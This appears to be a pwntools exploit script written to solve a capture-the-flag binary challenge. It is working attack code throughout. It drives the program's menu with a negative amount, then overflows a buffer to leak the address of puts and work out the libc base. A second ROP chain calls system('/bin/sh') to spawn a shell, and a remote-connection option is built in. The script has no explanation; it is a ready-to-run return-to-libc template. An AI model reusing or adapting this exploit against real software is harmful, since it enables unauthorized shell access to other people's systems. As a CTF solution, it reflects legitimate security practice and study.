#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
pop_rdi = 0x0000000000401186
ret = 0x000000000040101a
GDB()
sla(b"username: ", b"a" * 15)
sla(b"> \n", b"2")
sla(b"> \n", b"1")
sla(b"> \n", b"-200000")
sla(b"> \n", b"3")
sla(b"> \n", b"1")
sla(b"> \n", b"4")
payload = b"a" * 24 + p64(pop_rdi)
payload += p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(exe.sym['menu'])
sla(b"> \n", payload)

p.recvuntil(b"want.\n\n\n")
libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))

sla(b"> \n", b"3")
sla(b"> \n", b"1")
sla(b"> \n", b"4")
payload = b"a" * 24 + p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym['system'])
sla(b"> \n", payload)
p.interactive()
